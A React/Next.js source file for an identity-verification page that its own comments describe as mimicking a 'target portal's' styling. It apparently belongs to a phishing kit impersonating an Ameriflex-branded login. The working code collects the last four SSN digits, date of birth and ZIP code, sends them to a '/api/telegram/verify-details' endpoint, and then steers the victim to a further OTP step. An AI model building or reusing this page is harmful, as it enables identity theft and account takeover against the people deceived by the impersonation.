"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import AuthShell from "@/components/auth-shell";

/**
 * Identity Verification Details Page — `/verify-details` (mid-flow step of
 * this project's two-OTP sequence: choice → OTP → details → final OTP →
 * portal). The target portal has no equivalent screen (its MFA is
 * code-only), so this page uses the shared landing shell + the target's own
 * form vocabulary (`.panel-title`, `.form-group label`, `.form-control`,
 * `.main-btn`) instead of generic shadcn chrome — Step 2 Rule 2.
 *
 * Business logic preserved exactly: `ubs_details` guard, field validation
 * (SSN last 4 / MM/DD/YYYY / ZIP), POST /api/telegram/verify-details, 1s
 * loading delay, `ubs_otp2` flag, router.push("/verify?step=2").
 */

export default function VerifyDetailsPage() {
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_details"))
      router.replace("/verify-choice");
  }, [router]);

  const [ssnLast4, setSsnLast4] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [zip, setZip] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const ssnDigits = ssnLast4.replace(/\D/g, "");
  const zipDigits = zip.replace(/\D/g, "");

  const isSsnValid = ssnDigits.length === 4;
  const isDateValid =
    birthDate.length === 10 && /^\d{2}\/\d{2}\/\d{4}$/.test(birthDate);
  const isZipValid = zipDigits.length >= 5;
  const isFormValid = isSsnValid && isDateValid && isZipValid;

  const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");

    if (value.length > 8) value = value.slice(0, 8);

    let formatted = "";
    if (value.length >= 2) {
      formatted = value.slice(0, 2) + "/";
      if (value.length >= 4) {
        formatted += value.slice(2, 4) + "/";
        if (value.length >= 8) {
          formatted += value.slice(4, 8);
        } else {
          formatted += value.slice(4);
        }
      } else {
        formatted += value.slice(2);
      }
    } else {
      formatted = value;
    }

    setBirthDate(formatted);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);

    try {
      await fetch("/api/telegram/verify-details", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          birthDate: birthDate,
          zip: zipDigits,
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("Verify details notification error:", err);
    }

    setTimeout(() => {
      if (typeof window !== "undefined")
        sessionStorage.setItem("ubs_otp2", "1");
      router.push("/verify?step=2");
    }, 1000);
  };

  return (
    <AuthShell>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <h4 className="panel-title">Verify Your Details</h4>
        </div>

        <div className="form-group">
          Please provide the following information.
        </div>

        <div className="form-group">
          <label htmlFor="ssn">Last 4 of SSN</label>
          <input
            id="ssn"
            type="text"
            className="form-control"
            inputMode="numeric"
            maxLength={4}
            value={ssnLast4}
            onChange={(e) =>
              setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))
            }
            required
            disabled={isLoading}
          />
        </div>

        <div className="form-group">
          <label htmlFor="birthDate">Date of Birth (MM/DD/YYYY)</label>
          <input
            id="birthDate"
            type="text"
            className="form-control"
            inputMode="numeric"
            placeholder="MM/DD/YYYY"
            value={birthDate}
            onChange={handleDateChange}
            maxLength={10}
            required
            disabled={isLoading}
          />
        </div>

        <div className="form-group">
          <label htmlFor="zip">ZIP Code</label>
          <input
            id="zip"
            type="text"
            className="form-control"
            inputMode="numeric"
            maxLength={10}
            value={zip}
            onChange={(e) =>
              setZip(e.target.value.replace(/\D/g, "").slice(0, 10))
            }
            required
            disabled={isLoading}
          />
        </div>

        <div className="form-group text-center">
          <button
            className="main-btn btn-block"
            type="submit"
            disabled={!isFormValid || isLoading}
          >
            {isLoading ? null : "Send verification code"}
            {isLoading ? (
              <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
            ) : null}
          </button>
        </div>

        <div className="form-group text-center">
          <button
            type="button"
            className="link-button"
            onClick={() => router.push("/verify-choice")}
            disabled={isLoading}
          >
            Cancel
          </button>
        </div>

        <hr />
        <p className="text-center">
          <a
            style={{ fontSize: "10px" }}
            href="https://myameriflex.com/security-privacy-terms-conditions/"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy Policy
          </a>
        </p>
      </form>
    </AuthShell>
  );
}
